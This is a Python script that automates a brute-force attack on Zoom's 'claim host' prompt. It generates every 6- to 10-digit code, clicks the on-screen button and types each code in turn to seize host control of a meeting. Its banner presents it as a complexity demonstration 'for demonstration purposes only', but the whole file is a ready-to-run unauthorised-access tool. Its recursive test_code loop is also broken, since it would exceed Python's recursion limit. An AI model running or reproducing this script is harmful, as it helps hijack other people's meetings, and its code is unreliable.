#!/usr/bin/env python3

import itertools
import pyautogui
import pyperclip
import logging
import time
import timeit
import random
import schedule
import sys
from pynput.mouse import Button, Controller

pyautogui.FAILSAFE = True
mouse = Controller()
master_key = [] #master list of combinations

print('\n')

print("""PLEASE READ: This program demonstrates time and space complexity by generating all possible Zoom host codes. In order for the program to work properly, you need to:

--Be in a Zoom Room (preferably empty), of which you have access but are not the host.

--Click on the 'participants' icon in Zoom, a sidebar will appear and you should see a 'claim host' button.

The program will search your screen for the claim host button and try to input all code combinations. If you want to stop the program hit control-c or move your mouse to the upper left corner of your screen. This is for demonstration purposes only.""")

print('\n')

digit_query = input('Enter a number between 6 and 10 (hit control-c to terminate the program if it stalls): ')

def generate_combinations(digits):
    print('Creating key list...')
    combos = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=digits))
    for i in combos:
        res = ''.join(str(x) for x in i)
        master_key.append(res)

if 6 <= int(digit_query) <= 7:
    print('This should take less than a minute.')
    generate_combinations(int(digit_query))
    print('List complete!')
elif 8 <= int(digit_query) <= 10:
    warning = input('You are about to generate between 10 Million and 1 Billion numbers on your machine, do you wish to continue? [Y/N] ')
    if warning == 'Y' or warning == 'y':
        generate_combinations(int(digit_query))
        print('List complete!')
    elif warning == 'N' or warning == 'n':
        print('Bye :)')
        sys.exit()
    else:
        print('Wrong input..')
        sys.exit()
else:
    print('Bye :)')
    sys.exit()


print("The list contains {} items.".format(len(master_key))) # print the length of the list.
nex = iter(master_key) # turn master list into an iterator so we can grab
                       # one number at a time.


locate_claim = pyautogui.locateOnScreen('screen_finds/claimhostalt.png', confidence=.9)
claim_point = pyautogui.center(locate_claim)
print("Clicking 'Claim Host' button at --->", claim_point)
pyautogui.click(claim_point.x*.5, claim_point.y*.5)

time.sleep(.2)

def find_input():
    try:
        input_box_x, input_box_y = pyautogui.locateCenterOnScreen('screen_finds/inputbox.png', confidence=.9)
        pyautogui.click(input_box_x*.5, input_box_y*.5)
    except:
        input_box_x, input_box_y = pyautogui.locateCenterOnScreen('screen_finds/grayinput.png', confidence=.9)
        pyautogui.click(input_box_x*.5, input_box_y*.5)

find_input()



def click_claim():
    '''
    Click the blue claim host button that appears after
    numbers are entered.
    '''
    try:
        claim_x, claim_y = pyautogui.locateCenterOnScreen('screen_finds/blueclaimhost.png', confidence=.9, grayscale=True)
        pyautogui.click(claim_x*.5, claim_y*.5)
    except:
        claim_x, claim_y = pyautogui.locateCenterOnScreen('screen_finds/blueclaimhost.png', confidence=.9, grayscale=True)
        pyautogui.click(claim_x*.5, claim_y*.5)

# #
def turn_key(i):
    '''
    Grab the next number from the master_list
    '''
    return next(i)

def copy(keycode):
    pyperclip.copy(keycode)
    print("Trying {}".format(keycode))

def paste(keycode):
    pyautogui.write(keycode)
    pyautogui.press('enter')

def test_code(code):
    key = turn_key(code)
    copy(key)
    paste(key)
    click_claim()
    pyautogui.move(-100, 0)
    mouse.click(Button.left, 2)
    pyautogui.press('backspace')
    end = time.time()
    for i in master_key:
        test_code(nex)

test_code(nex)
